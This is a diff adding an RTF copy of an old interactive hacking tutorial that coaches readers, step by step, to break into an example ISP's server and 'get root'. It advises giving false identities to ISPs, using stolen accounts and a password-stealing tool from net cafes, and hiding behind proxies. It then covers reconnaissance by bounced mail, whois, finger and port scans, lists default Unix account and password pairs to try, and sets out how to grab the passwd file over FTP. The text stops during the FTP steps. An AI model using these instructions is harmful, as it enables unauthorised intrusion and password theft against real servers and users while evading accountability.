@@ -1,0 +1,508 @@
+{\rtf1\ansi\ansicpg1252\deff0\deflang3081{\fonttbl{\f0\fswiss\fcharset0 Arial;}{\f1\froman\fcharset0 Times New Roman;}{\f2\fnil\fcharset0 verdana;}}
+{\colortbl ;\red0\green0\blue255;\red0\green0\blue0;\red0\green128\blue128;}
+\viewkind4\uc1\pard\sb100\sa100\qc\f0\fs20{\pict\wmetafile8\picw3175\pich1058\picwgoal1800\pichgoal600 
+0100090000035e00000003001c00000000000400000003010600050000000c022204670c070000
+00fc020000000000000000040000002d01000008000000fa020000000000000000000004000000
+2d0101001c000000fb020c00090000000000900100000000000202024d532053616e7320536572
+6966008a0100000000ffffffffd4c113002942c877040000002d01020012000000210517006368
+6f696365732e6769662028353338206279746573290028ffd500030000000000
+}\f1\fs24\par
+\f2\fs18 [\cf1\ul I Want to Start at the Start\cf0\ulnone ]\f1\fs24\par
+\f2\fs18 [\cf1\ul I Want to Go Straight to Hacking\cf0\ulnone ]\f1\fs24\par
+\pard\sb100\sa100\par
+\cf2\f2\fs18 INTRODUCTION:\cf0\f1\fs24\par
+\cf2\f2\fs18\line A little background is needed before we get into hacking techniques.\line\line When we talk about \lquote Hacking\rquote , we are talking about getting some access on a server we shouldn\rquote t have. Servers are set up so that many people can use them. These people each have different \lquote accounts\rquote  on the server \endash  like different directories that belong just to them. If Fred has an account with the froggy.com.au ISP (Internet Service Provider), he will be given:\cf0\f1\fs24\par
+\cf2\f2\fs18 (1) a login name, which is like the name of your directory; and\line (2) a password, which lets you get access to that directory.\cf0\f1\fs24\par
+\cf2\f2\fs18 This login name and password will usually give you access to all of Fred\rquote s services - his mail, news services and web pages. There is also the \lquote root\rquote  account, which has it\rquote s own login and password. This gives super-user access to the entire server. We will focus on \lquote getting root\rquote , in this help file.\cf0\f1\fs24\par
+\pard\sb100\sa100\qc\f0\fs20{\pict\wmetafile8\picw3175\pich1058\picwgoal1800\pichgoal600 
+0100090000035e00000003001c00000000000400000003010600050000000c022204670c070000
+00fc020000000000000000040000002d01000008000000fa020000000000000000000004000000
+2d0101001c000000fb020c00090000000000900100000000000202024d532053616e7320536572
+6966008a0100000000ffffffffd4c113002942c877040000002d01020012000000210517006368
+6f696365732e6769662028353338206279746573290028ffd500030000000000
+}\f1\fs24\par
+\f2\fs18 [\cf1\ul Ok, I want to move to the 'anatomy of the hack\cf0\ulnone ']\f1\fs24\par
+\f2\fs18 [\cf1\ul I know all this, let me move straight to hacking\cf0\ulnone ]\f1\fs24\par
+\f2\fs18 [\cf1\ul\line\cf0\ulnone I don't have a clue what you're on about, let me read some backgroundon this so called "Internet" you keep referring to <http://www.cyberarmy.com/tute/htext1.shtml>]\f1\fs24\par
+\pard\sb100\sa100\par
+\f2\fs18 THE ANATOMY OF THE 'HACK':\f1\fs24\par
+\cf2\f2\fs18 There are two main ways to break into a system. Think of a server as a Swiss Bank Vault. There are two main ways to get in. You can try to get in by finding the combination of the vault. This is like finding the password. It\rquote s how you are meant to get in. The second way is by using dynamite. You forget all about the \lquote proper\rquote  way to get in. This is like using \lquote exploits\rquote , or weaknesses in the servers operating system to gain access.\cf0\f1\fs24\par
+\pard\sb100\sa100\qc\f0\fs20{\pict\wmetafile8\picw3175\pich1058\picwgoal1800\pichgoal600 
+0100090000035e00000003001c00000000000400000003010600050000000c022204670c070000
+00fc020000000000000000040000002d01000008000000fa020000000000000000000004000000
+2d0101001c000000fb020c00090000000000900100000000000202024d532053616e7320536572
+6966008a0100000000ffffffffd4c113002942c877040000002d01020012000000210517006368
+6f696365732e6769662028353338206279746573290028ffd500030000000000
+}\f1\fs24\par
+\f2\fs18 [\cf1\ul Ok, Let's Go. Tell Me About Not Getting Caught\cf0\ulnone ]\f1\fs24\par
+\f2\fs18 [\cf1\ul Stuff it, I know how to not get caught, on to the techniques!\cf0\ulnone ]\f1\fs24\par
+\pard\sb100\sa100\par
+\pard\sb100\sa100\qc\cf2\f2\fs18 'DON'T GET CAUGHT':\cf0\f1\fs24\par
+\pard\sb100\sa100\f2\fs18\line Hacking is illegal, and it is very easy to trace you if froggy.com.au realizes you hacked them. Wherever you go, \line your IP number (your computer\rquote s unique identification) is left and often logged. Solutions:\line\line 1. When you set up your account with an ISP, give a false name and address.\f1\fs24\par
+\pard\sb100\sa100\qc\f0\fs20{\pict\wmetafile8\picw3175\pich1058\picwgoal1800\pichgoal600 
+0100090000035e00000003001c00000000000400000003010600050000000c022204670c070000
+00fc020000000000000000040000002d01000008000000fa020000000000000000000004000000
+2d0101001c000000fb020c00090000000000900100000000000202024d532053616e7320536572
+6966008a0100000000ffffffffd4c113002942c877040000002d01020012000000210517006368
+6f696365732e6769662028353338206279746573290028ffd500030000000000
+}\f1\fs24\par
+\f2\fs18 [\cf1\ul Nah, I can't be bothered, what other things can I do?\cf0\ulnone ]\f1\fs24\par
+\f2\fs18 [\cf1\ul Ok, I used this trick. What else can I do?\cf0\ulnone ]\f1\fs24\par
+\f2\fs18 [\cf1\ul Stuff it, I know how to not get caught, on to the techniques!\cf0\ulnone ]\f1\fs24\par
+\pard\sb100\sa100\par
+\cf2\f2\fs18 'DON'T GET CAUGHT':\cf0\f1\fs24\par
+\f2\fs18 2. Hack using a filched account (stolen password, etc.). A tool called \cf1\ul Dripper <http://www.cyberarmy.com/files/dripper.zip>\cf0\ulnone  can steal passwords for you from public net cafes and libraries.\f1\fs24\par
+\pard\sb100\sa100\qc\f0\fs20{\pict\wmetafile8\picw3175\pich1058\picwgoal1800\pichgoal600 
+0100090000035e00000003001c00000000000400000003010600050000000c022204670c070000
+00fc020000000000000000040000002d01000008000000fa020000000000000000000004000000
+2d0101001c000000fb020c00090000000000900100000000000202024d532053616e7320536572
+6966008a0100000000ffffffffd4c113002942c877040000002d01020012000000210517006368
+6f696365732e6769662028353338206279746573290028ffd500030000000000
+}\f1\fs24\par
+\f2\fs18 [\cf1\ul Nah, just tell me something easy I can do right now\cf0\ulnone ]\f1\fs24\par
+\f2\fs18 [\cf1\ul Ok, done. Anything else I should do?\cf0\ulnone ]\f1\fs24\par
+\pard\sb100\sa100\par
+\f2\fs18 'DON'T GET CAUGHT':\f1\fs24\par
+\f2\fs18 3. Port your connection through something else.\f1\fs24\par
+\f2\fs18 An easy way to do this is to change your proxy settings. By using the proxy settings meant for a different ISP, it can look like you are surfing from wherever that ISP is. A list of proxies you can use is \cf1\ul here <http://www.cyberarmy.com/lists/proxy>\cf0\ulnone .\f1\fs24\par
+\f2\fs18 You should also do any important info gathering through the IP Jamming Applet on the \cf1\ul Cyberarmy.Com <http://www.cyberarmy.com>\cf0\ulnone  to hide your IP.\f1\fs24\par
+\f2\fs18 If you want super anonymity, you should be surfing in an account you set up under a false name, with your proxy settings changed, and also surfing through the IP Jamming applet! Be aware that some ISPs could use Caller ID to test the number of someone logging on. Dial the relevant code to disable Caller ID before calling your ISP.\f1\fs24\par
+\pard\sb100\sa100\qc\f2\fs18\line\f0\fs20{\pict\wmetafile8\picw3175\pich1058\picwgoal1800\pichgoal600 
+0100090000035e00000003001c00000000000400000003010600050000000c022204670c070000
+00fc020000000000000000040000002d01000008000000fa020000000000000000000004000000
+2d0101001c000000fb020c00090000000000900100000000000202024d532053616e7320536572
+6966008a0100000000ffffffffd4c113002942c877040000002d01020012000000210517006368
+6f696365732e6769662028353338206279746573290028ffd500030000000000
+}\f1\fs24\par
+\f2\fs18 [\cf1\ul I don't understand about the proxy settings thing, let me read more <http://www.cyberarmy.com/tute/htext3.shtml>\cf0\ulnone ]\f1\fs24\par
+\f2\fs18 [\cf1\ul Ok, I am wired for hyper stealth... Now, I want to HACK!\cf0\ulnone ]\f1\fs24\par
+\pard\sb100\sa100\par
+\f2\fs18 INFO GATHERING:\line\line To start off, you will probably need to gather information about www.\cf2 froggy.com.au \cf0 using internet tools.\f1\fs24\par
+\pard\sb100\sa100\qc\f0\fs20{\pict\wmetafile8\picw3175\pich1058\picwgoal1800\pichgoal600 
+0100090000035e00000003001c00000000000400000003010600050000000c022204670c070000
+00fc020000000000000000040000002d01000008000000fa020000000000000000000004000000
+2d0101001c000000fb020c00090000000000900100000000000202024d532053616e7320536572
+6966008a0100000000ffffffffd4c113002942c877040000002d01020012000000210517006368
+6f696365732e6769662028353338206279746573290028ffd500030000000000
+}\f1\fs24\par
+\f2\fs18 [\cf1\ul Ok, how?\cf0\ulnone ]\f1\fs24\par
+\f2\fs18 [\cf1\ul Give me some reading to do about info gathering <http://www.cyberarmy.com/tute/htext2.shtml>\cf0\ulnone ]\f1\fs24\par
+\f2\fs18 [\cf1\ul No, I've already got all the info, just tell me what to do\cf0\ulnone ]\f1\fs24\par
+\pard\sb100\sa100\par
+\f2\fs18 DIRT DIGGING STAGE:\f1\fs24\par
+\f2\fs18 We are now taking the first steps of any hack... Info Gathering.\f1\fs24\par
+\f2\fs18 You should be set up for stealth mode. Get a notepad, and open a new browser window (through the IP Jammer). Bring the \cf2 www.froggy.com.au \cf0 's web page up in the IP Jammer's window. You can load the IP Jamming applet on the \cf1\ul Cyberarmy.Com <http://www.cyberarmy.com>\cf0\ulnone .\f1\fs24\par
+\pard\sb100\sa100\qc\f0\fs20{\pict\wmetafile8\picw3175\pich1058\picwgoal1800\pichgoal600 
+0100090000035e00000003001c00000000000400000003010600050000000c022204670c070000
+00fc020000000000000000040000002d01000008000000fa020000000000000000000004000000
+2d0101001c000000fb020c00090000000000900100000000000202024d532053616e7320536572
+6966008a0100000000ffffffffd4c113002942c877040000002d01020012000000210517006368
+6f696365732e6769662028353338206279746573290028ffd500030000000000
+}\f1\fs24\par
+\f2\fs18 [\cf1\ul Ok, What Now?\cf0\ulnone ]\f1\fs24\par
+\pard\sb100\sa100\par
+\f2\fs18 CASE THE JOINT:\f1\fs24\par
+\f2\fs18 1. First, check out the site. Take down any email addresses, copy down the HTML of important pages.\f1\fs24\par
+\pard\sb100\sa100\qc\f0\fs20{\pict\wmetafile8\picw3175\pich1058\picwgoal1800\pichgoal600 
+0100090000035e00000003001c00000000000400000003010600050000000c022204670c070000
+00fc020000000000000000040000002d01000008000000fa020000000000000000000004000000
+2d0101001c000000fb020c00090000000000900100000000000202024d532053616e7320536572
+6966008a0100000000ffffffffd4c113002942c877040000002d01020012000000210517006368
+6f696365732e6769662028353338206279746573290028ffd500030000000000
+}\f1\fs24\par
+\f2\fs18 [\cf1\ul Done... What Else?\cf0\ulnone ]\f1\fs24\par
+\pard\sb100\sa100\par
+\f2\fs18 THE OLD BOUNCING MAIL TRICK:\f1\fs24\par
+\f2\fs18 2. Send a mail that will bounce to the site. If the site is www.froggy.com.au , send a mail to blahblahblah@froggy.com.au . It will bounce back to you and give you information in its header.\f1\fs24\par
+\f2\fs18 Copy the information from the headers down.\f1\fs24\par
+\f2\fs18 (To maintain anonymity, it might be a good idea to send and receive the mail from a free web based provider, such as hotmail.com. Use full stealth features when sending the bouncing mail. This will protect you when they check through the logs after they are hacked.)\f1\fs24\par
+\pard\sb100\sa100\qc\f0\fs20{\pict\wmetafile8\picw3175\pich1058\picwgoal1800\pichgoal600 
+0100090000035e00000003001c00000000000400000003010600050000000c022204670c070000
+00fc020000000000000000040000002d01000008000000fa020000000000000000000004000000
+2d0101001c000000fb020c00090000000000900100000000000202024d532053616e7320536572
+6966008a0100000000ffffffffd4c113002942c877040000002d01020012000000210517006368
+6f696365732e6769662028353338206279746573290028ffd500030000000000
+}\f1\fs24\par
+\f2\fs18 [\cf1\ul Done... What Else?\cf0\ulnone ]\f1\fs24\par
+\pard\sb100\sa100\par
+\f2\fs18 TRACEROUTE:\f1\fs24\par
+\f2\fs18 3. Still using stealth features, Traceroute \cf2 froggy.com.au \cf0 . This Traceroute search is avaliable from the Hacker's Home Page, in the Net Tools section.\f1\fs24\par
+\f2\fs18 This will tell you the upstream provider of the victim server.\f1\fs24\par
+\pard\brdrb\brdrdb\brdrw10\brdrcf2 \sb100\sa100\qc\v\f0\fs16 Top of Form 1\par
+\trowd\trqc\trbrdrb\brdrdb\brdrw10 \cellx3015\cellx6060\cellx7755\pard\intbl\cf2\v0\f2\fs24 TOOLS\cf3  \fs18   \cf0\f0\fs20{\pict\wmetafile8\picw635\pich635\picwgoal360\pichgoal360 
+0100090000034c00000003001c00000000000400000003010600050000000c027b027b02070000
+00fc020000000000000000040000002d01000008000000fa020000000000000000000004000000
+2d0101001c000000fb020c00090000000000900100000000000202024d532053616e7320536572
+6966008a0100000000ffffffffa8c113002942c877040000002d010200030000000000
+}\f1\fs24\cell\cf3\f2\fs20  \cf0\f0{\pict\wmetafile8\picw635\pich635\picwgoal360\pichgoal360 
+0100090000034c00000003001c00000000000400000003010600050000000c027b027b02070000
+00fc020000000000000000040000002d01000008000000fa020000000000000000000004000000
+2d0101001c000000fb020c00090000000000900100000000000202024d532053616e7320536572
+6966008a0100000000ffffffffccc113002942c877040000002d010200030000000000
+}\f1\fs24\cell\f0\fs20{\pict\wmetafile8\picw635\pich635\picwgoal360\pichgoal360 
+0100090000034c00000003001c00000000000400000003010600050000000c027b027b02070000
+00fc020000000000000000040000002d01000008000000fa020000000000000000000004000000
+2d0101001c000000fb020c00090000000000900100000000000202024d532053616e7320536572
+6966008a0100000000ffffffffccc113002942c877040000002d010200030000000000
+}\f1\fs24\cell\row
+\pard\brdrt\brdrdb\brdrw10\brdrcf2 \sb100\sa100\qc\v\f0\fs16 Bottom of Form 1\par
+\pard\sb100\sa100\qc\v0\fs20{\pict\wmetafile8\picw3175\pich1058\picwgoal1800\pichgoal600 
+0100090000035e00000003001c00000000000400000003010600050000000c022204670c070000
+00fc020000000000000000040000002d01000008000000fa020000000000000000000004000000
+2d0101001c000000fb020c00090000000000900100000000000202024d532053616e7320536572
+6966008a0100000000ffffffffd4c113002942c877040000002d01020012000000210517006368
+6f696365732e6769662028353338206279746573290028ffd500030000000000
+}\f1\fs24\par
+\f2\fs18 [\cf1\ul Ok, what next?\cf0\ulnone ]\f1\fs24\par
+\pard\sb100\sa100\par
+\f2\fs18 WHOIS:\f1\fs24\par
+\f2\fs18 3. Still using stealth features, Whois the site. This Whois search is avaliable from the Hacker's Home Page, in the Net Tools section.\f1\fs24\par
+\f2\fs18 This will give you information on the owners and servers that run the site. Write it down.\f1\fs24\par
+\pard\brdrb\brdrdb\brdrw10\brdrcf2 \sb100\sa100\qc\v\f0\fs16 Top of Form 2\par
+\trowd\trqc\trbrdrb\brdrdb\brdrw10 \cellx3015\cellx6060\cellx7755\pard\intbl\cf2\v0\f2\fs24 TOOLS\cf3  \fs18   \cf0\f0\fs20{\pict\wmetafile8\picw635\pich635\picwgoal360\pichgoal360 
+0100090000034c00000003001c00000000000400000003010600050000000c027b027b02070000
+00fc020000000000000000040000002d01000008000000fa020000000000000000000004000000
+2d0101001c000000fb020c00090000000000900100000000000202024d532053616e7320536572
+6966008a0100000000ffffffffa8c113002942c877040000002d010200030000000000
+}\f1\fs24\cell\cf3\f2\fs20  \cf0\f0{\pict\wmetafile8\picw635\pich635\picwgoal360\pichgoal360 
+0100090000034c00000003001c00000000000400000003010600050000000c027b027b02070000
+00fc020000000000000000040000002d01000008000000fa020000000000000000000004000000
+2d0101001c000000fb020c00090000000000900100000000000202024d532053616e7320536572
+6966008a0100000000ffffffffccc113002942c877040000002d010200030000000000
+}\f1\fs24\cell\f0\fs20{\pict\wmetafile8\picw635\pich635\picwgoal360\pichgoal360 
+0100090000034c00000003001c00000000000400000003010600050000000c027b027b02070000
+00fc020000000000000000040000002d01000008000000fa020000000000000000000004000000
+2d0101001c000000fb020c00090000000000900100000000000202024d532053616e7320536572
+6966008a0100000000ffffffffccc113002942c877040000002d010200030000000000
+}\f1\fs24\cell\row
+\pard\brdrt\brdrdb\brdrw10\brdrcf2 \sb100\sa100\qc\v\f0\fs16 Bottom of Form 2\par
+\pard\sb100\sa100\qc\v0\fs20{\pict\wmetafile8\picw3175\pich1058\picwgoal1800\pichgoal600 
+0100090000035e00000003001c00000000000400000003010600050000000c022204670c070000
+00fc020000000000000000040000002d01000008000000fa020000000000000000000004000000
+2d0101001c000000fb020c00090000000000900100000000000202024d532053616e7320536572
+6966008a0100000000ffffffffd4c113002942c877040000002d01020012000000210517006368
+6f696365732e6769662028353338206279746573290028ffd500030000000000
+}\f1\fs24\par
+\f2\fs18 [\cf1\ul Ok, what next?\cf0\ulnone ]\f1\fs24\par
+\pard\sb100\sa100\par
+\f2\fs18 GIVE 'EM THE FINGER:\f1\fs24\par
+\f2\fs18 4. Finger the site. Use this finger service at Cyberarmy.Com to check the site. Try fingering just with \ldblquote finger @froggy.com.au \rdblquote  first. This sometimes tells you the names of all accounts. If this does not work, try fingering any email addresses you found on the site, and through Whois. This will sometimes give you useful information.\f1\fs24\par
+\pard\brdrb\brdrdb\brdrw10\brdrcf2 \sb100\sa100\qc\v\f0\fs16 Top of Form 3\par
+\trowd\trqc\trbrdrb\brdrdb\brdrw10 \cellx2132\cellx3880\cellx5628\pard\intbl\cf2\v0\f2\fs24 FINGER\cf3\f1  \cf0\f0\fs20{\pict\wmetafile8\picw635\pich635\picwgoal360\pichgoal360 
+0100090000034c00000003001c00000000000400000003010600050000000c027b027b02070000
+00fc020000000000000000040000002d01000008000000fa020000000000000000000004000000
+2d0101001c000000fb020c00090000000000900100000000000202024d532053616e7320536572
+6966008a0100000000ffffffffccc113002942c877040000002d010200030000000000
+}\cf3\f1\fs24 @ \cf0\cell\cf3  \cf0\f0\fs20{\pict\wmetafile8\picw635\pich635\picwgoal360\pichgoal360 
+0100090000034c00000003001c00000000000400000003010600050000000c027b027b02070000
+00fc020000000000000000040000002d01000008000000fa020000000000000000000004000000
+2d0101001c000000fb020c00090000000000900100000000000202024d532053616e7320536572
+6966008a0100000000ffffffffccc113002942c877040000002d010200030000000000
+}\f1\fs24\cell\f0\fs20{\pict\wmetafile8\picw635\pich635\picwgoal360\pichgoal360 
+0100090000034c00000003001c00000000000400000003010600050000000c027b027b02070000
+00fc020000000000000000040000002d01000008000000fa020000000000000000000004000000
+2d0101001c000000fb020c00090000000000900100000000000202024d532053616e7320536572
+6966008a0100000000ffffffffccc113002942c877040000002d010200030000000000
+}\f1\fs24\cell\row
+\pard\brdrt\brdrdb\brdrw10\brdrcf2 \sb100\sa100\qc\v\f0\fs16 Bottom of Form 3\par
+\pard\sb100\sa100\qc\v0\fs20{\pict\wmetafile8\picw3175\pich1058\picwgoal1800\pichgoal600 
+0100090000035e00000003001c00000000000400000003010600050000000c022204670c070000
+00fc020000000000000000040000002d01000008000000fa020000000000000000000004000000
+2d0101001c000000fb020c00090000000000900100000000000202024d532053616e7320536572
+6966008a0100000000ffffffffd4c113002942c877040000002d01020012000000210517006368
+6f696365732e6769662028353338206279746573290028ffd500030000000000
+}\f1\fs24\par
+\f2\fs18 [\cf1\ul Ok, what next?\cf0\ulnone ]\f1\fs24\par
+\pard\sb100\sa100\par
+\f2\fs18 THE DEADLY PORT SCAN:\f1\fs24\par
+\f2\fs18 5. Now, we're about to get rough on the site. Port Scan the site.\f1\fs24\par
+\f2\fs18 Port scanning checks for all open ports for an IP. It is extremely useful, however, it practially screams to the webmaster's of the victim site that they are in the middle of being hacked. The is basically no legitimate reason to port scan a site unless you are about to hack it.\f1\fs24\par
+\f2\fs18 There are no very good ways to hide a port scan, but there are a few semi-stealthy port scanners. Most are only for Linux / Unix systems. However, the Exploit Generator for Windows is one that claims to be stealthy. However, if you are trying to enter a very secure site, perhaps forget about port scanning for now, unless you are running Linux.\f1\fs24\par
+\f2\fs18 Though, port scan will tell you all the services a site is running. If port 21 is open, it means they have an FTP server. If port 23 is open, it means they have telnet.\f1\fs24\par
+\pard\sb100\sa100\qc\f0\fs20{\pict\wmetafile8\picw3175\pich1058\picwgoal1800\pichgoal600 
+0100090000035e00000003001c00000000000400000003010600050000000c022204670c070000
+00fc020000000000000000040000002d01000008000000fa020000000000000000000004000000
+2d0101001c000000fb020c00090000000000900100000000000202024d532053616e7320536572
+6966008a0100000000ffffffffd4c113002942c877040000002d01020012000000210517006368
+6f696365732e6769662028353338206279746573290028ffd500030000000000
+}\f1\fs24\par
+\f2\fs18 [\cf1\ul Ok, What next?\cf0\ulnone ]\f1\fs24\par
+\pard\sb100\sa100\par
+\f2\fs18 TELNETTING:\f1\fs24\par
+\f2\fs18 5. The aim of telnetting to the site is basically to try and find out the server type. While your browser is in stealth mode, use the Anonymous Telnet applet in the \cf1\ul Cyberarmy.Com <http://www.cyberarmy.com>\cf0\ulnone  to open a Telnet window.\f1\fs24\par
+\f2\fs18 Telnet to the site to Port 23. Usually, if the address is \ldblquote www.froggy.com.au \rdblquote , try telnetting to "froggy.com.au ". If this does not work, try to telnet to telnet.froggy.com.au or try telnetting to any of the sites listed as name servers in your previous Whois search. Once you have got access, note any information it gives you, such as server type.\f1\fs24\par
+\pard\sb100\sa100\qc\f0\fs20{\pict\wmetafile8\picw3175\pich1058\picwgoal1800\pichgoal600 
+0100090000035e00000003001c00000000000400000003010600050000000c022204670c070000
+00fc020000000000000000040000002d01000008000000fa020000000000000000000004000000
+2d0101001c000000fb020c00090000000000900100000000000202024d532053616e7320536572
+6966008a0100000000ffffffffd4c113002942c877040000002d01020012000000210517006368
+6f696365732e6769662028353338206279746573290028ffd500030000000000
+}\f1\fs24\par
+\f2\fs18 [\cf1\ul This worked - I got the server type!\cf0\ulnone ]\f1\fs24\par
+\f2\fs18 [\cf1\ul None of that worked...\cf0\ulnone ]\f1\fs24\par
+\pard\sb100\sa100\par
+\f2\fs18 TELNETTING:\f1\fs24\par
+\f2\fs18 Now change the telnet to port 21. This should send you straight in to the server's FTP port. If this works, try typing SYST to find out what server type it is.\f1\fs24\par
+\pard\sb100\sa100\qc\f0\fs20{\pict\wmetafile8\picw3175\pich1058\picwgoal1800\pichgoal600 
+0100090000035e00000003001c00000000000400000003010600050000000c022204670c070000
+00fc020000000000000000040000002d01000008000000fa020000000000000000000004000000
+2d0101001c000000fb020c00090000000000900100000000000202024d532053616e7320536572
+6966008a0100000000ffffffffd4c113002942c877040000002d01020012000000210517006368
+6f696365732e6769662028353338206279746573290028ffd500030000000000
+}\f1\fs24\par
+\f2\fs18 [\cf1\ul This worked - I got the server type!\cf0\ulnone ]\f1\fs24\par
+\f2\fs18 [\cf1\ul None of that worked...\cf0\ulnone ]\f1\fs24\par
+\pard\sb100\sa100\par
+\f2\fs18 TELNETTING:\f1\fs24\par
+\f2\fs18 Now, if you are lucky, try telnetting to port 80, the HTTP port. Note if this gives you any information.\f1\fs24\par
+\pard\sb100\sa100\qc\f0\fs20{\pict\wmetafile8\picw3175\pich1058\picwgoal1800\pichgoal600 
+0100090000035e00000003001c00000000000400000003010600050000000c022204670c070000
+00fc020000000000000000040000002d01000008000000fa020000000000000000000004000000
+2d0101001c000000fb020c00090000000000900100000000000202024d532053616e7320536572
+6966008a0100000000ffffffffd4c113002942c877040000002d01020012000000210517006368
+6f696365732e6769662028353338206279746573290028ffd500030000000000
+}\f1\fs24\par
+\f2\fs18 [\cf1\ul This worked - I got the server type!\cf0\ulnone ]\f1\fs24\par
+\f2\fs18 [\cf1\ul None of that worked...\cf0\ulnone ]\f1\fs24\par
+\pard\sb100\sa100\par
+\f2\fs18 RUNNING LAME PROGRAMS:\f1\fs24\par
+\f2\fs18 You *need* to know the server type to have any hope of hacking the thing. How do you expect to run exploits against it if you cant even figure out what you're dealing with here?\f1\fs24\par
+\f2\fs18 A final resort is to run a program called Whats Running? It doesn't work very well, but will sometimes tell you the server type. It will also probably be logged by the victim server.\f1\fs24\par
+\f2\fs18 If that doesn't work, do anything to find the server type. Even write them an e-mail asking what operating system they're running.\f1\fs24\par
+\pard\sb100\sa100\qc\f0\fs20{\pict\wmetafile8\picw3175\pich1058\picwgoal1800\pichgoal600 
+0100090000035e00000003001c00000000000400000003010600050000000c022204670c070000
+00fc020000000000000000040000002d01000008000000fa020000000000000000000004000000
+2d0101001c000000fb020c00090000000000900100000000000202024d532053616e7320536572
+6966008a0100000000ffffffffd4c113002942c877040000002d01020012000000210517006368
+6f696365732e6769662028353338206279746573290028ffd500030000000000
+}\f1\fs24\par
+\f2\fs18 [\cf1\ul Ok, I've got the Info... Now I want access!\cf0\ulnone ]\f1\fs24\par
+\pard\sb100\sa100\par
+\f2\fs18 HACKING THROUGH THE PASSWORD:\f1\fs24\par
+\f2\fs18 We will now try to go through the front door of the server. As to our analogy, we are trying to find the combination of the safe.\f1\fs24\par
+\pard\sb100\sa100\qc\f0\fs20{\pict\wmetafile8\picw3175\pich1058\picwgoal1800\pichgoal600 
+0100090000035e00000003001c00000000000400000003010600050000000c022204670c070000
+00fc020000000000000000040000002d01000008000000fa020000000000000000000004000000
+2d0101001c000000fb020c00090000000000900100000000000202024d532053616e7320536572
+6966008a0100000000ffffffffd4c113002942c877040000002d01020012000000210517006368
+6f696365732e6769662028353338206279746573290028ffd500030000000000
+}\f1\fs24\par
+\f2\fs18 [\cf1\ul Ok, I Want Root!\cf0\ulnone ]\f1\fs24\par
+\f2\fs18 [\cf1\ul Nah, I already know this server will need exploits\cf0\ulnone ]\f1\fs24\par
+\pard\sb100\sa100\par
+\f2\fs18 EASY THINGS FIRST:\line\line You would kick yourselves if ya spent weeks trying advanced hacking with exploits, IP spoofing and social \line engineering, just to find that we could have got in by using:\line\line $Login: root\line $Password: root\line\line So, let\rquote s just try this first and get it out of the way. Unix comes set up with some default passwords, and \line sometimes these are not changed. So, we telnet to froggy.com.au .\line\line Don\rquote t use your usual telnet program. Unless you are using a filched or anonymous account, it will show \line your IP address to froggy.com.au . With your proxies changed, and everything set for stealth, switch back to the Anonymous Telnet window.\line\line Then try the following accounts and passwords:\line\line ACCOUNT: PASSWORD\line (login) root: (password)root\line sys: sys / system / bin\line bin: sys / bin\line mountfsys: mountfsys\line adm: adm\line uucp: uucp\line nuucp: anon\line anon: anon\line user: user\line games: games\line install: install\line demo: demo\line umountfsys: umountfsys\line sync: sync\line admin: admin\line guest: guest\line daemon: daemon\line\line The accounts root, mountfsys, umountfsys, install, and sometimes sync are root level accounts, meaning they have sysop power, or total power. Other logins are just "user level" logins meaning they only have power \line over what files/processes they own.\f1\fs24\par
+\pard\sb100\sa100\qc\f0\fs20{\pict\wmetafile8\picw3175\pich1058\picwgoal1800\pichgoal600 
+0100090000035e00000003001c00000000000400000003010600050000000c022204670c070000
+00fc020000000000000000040000002d01000008000000fa020000000000000000000004000000
+2d0101001c000000fb020c00090000000000900100000000000202024d532053616e7320536572
+6966008a0100000000ffffffffd4c113002942c877040000002d01020012000000210517006368
+6f696365732e6769662028353338206279746573290028ffd500030000000000
+}\f1\fs24\par
+\f2\fs18 [\cf1\ul Nup... Didn't think it would work\cf0\ulnone ]\f1\fs24\par
+\f2\fs18 [\cf1\ul Incredible... That Lame Trick Actually Worked!\cf0\ulnone ]\f1\fs24\par
+\pard\sb100\sa100\par
+\f2\fs18 USING THE LOGIN NAMES:\f1\fs24\par
+\f2\fs18 Still simple things first. About 1 in 20 people are stupid enough to have the same login name and password. With your list of all the email addresses or finger information you dug from the site, try this.\f1\fs24\par
+\f2\fs18 For example, if the web site made a reference to fred@froggy.com.au , try logging in (through telnet or a FTP \line program to their server) as:\line\line $Login: Fred\line $Password: Fred\line\line Do this with all the names you have found - you might get lucky.\line\line Did this work?\f1\fs24\par
+\pard\sb100\sa100\qc\f0\fs20{\pict\wmetafile8\picw3175\pich1058\picwgoal1800\pichgoal600 
+0100090000035e00000003001c00000000000400000003010600050000000c022204670c070000
+00fc020000000000000000040000002d01000008000000fa020000000000000000000004000000
+2d0101001c000000fb020c00090000000000900100000000000202024d532053616e7320536572
+6966008a0100000000ffffffffd4c113002942c877040000002d01020012000000210517006368
+6f696365732e6769662028353338206279746573290028ffd500030000000000
+}\f1\fs24\par
+\f2\fs18 [\cf1\ul Nah, they had some baddass security, didn't work\cf0\ulnone ]\f1\fs24\par
+\f2\fs18 [\cf1\ul Oh, Golly Gee... I got access to one of the accounts!\cf0\ulnone ]\f1\fs24\par
+\pard\sb100\sa100\par
+\f2\fs18 GETTING THE PASSWD FILE:\line\line You probably had no luck until now. Actually, most hacking techniques only have a slim chance of success. You just try hundreds of slim chances till you get it.\f1\fs24\par
+\f2\fs18 Assuming you were trying to log in on a Unix system, you may have been wondering how Unix checks to see whether the passwords you gave were correct or not. There is a file called \lquote passwd\rquote  on each Unix system which has all the passwords for each user. So, if we can\rquote t guess the passwords, we will now try to rip this file and decrypt it.\f1\fs24\par
+\pard\sb100\sa100\qc\f0\fs20{\pict\wmetafile8\picw3175\pich1058\picwgoal1800\pichgoal600 
+0100090000035e00000003001c00000000000400000003010600050000000c022204670c070000
+00fc020000000000000000040000002d01000008000000fa020000000000000000000004000000
+2d0101001c000000fb020c00090000000000900100000000000202024d532053616e7320536572
+6966008a0100000000ffffffffd4c113002942c877040000002d01020012000000210517006368
+6f696365732e6769662028353338206279746573290028ffd500030000000000
+}\f1\fs24\par
+\f2\fs18 [\cf1\ul Make it so, Number 1\cf0\ulnone ]\f1\fs24\par
+\pard\sb100\sa100\par
+\f2\fs18 ANCIENT CHINESE FTP METHOD:\f1\fs24\par
+\f2\fs18 Your browser should be set to use the fake proxies. We will keep using this browser to FTP, because it cannot be easily traced, whereas something like CuteFTP can be traced to you because it can't use proxies. If in your port scan, you found an opne port 21, its a pretty good indication that they run an FTP server.\f1\fs24\par
+\f2\fs18 Using your stealth browser, try to FTP to froggy.com.au . Example: ftp://froggy.com.au \line\line If that does not work, try to FTP to ftp.froggy.com.au . Example: ftp://ftp.froggy.com.au \line\line If that does not work, try to FTP to the Domain Name Servers listed when you did your WHOIS search. Example: ftp://ns1.froggy.com.au \f1\fs24\par
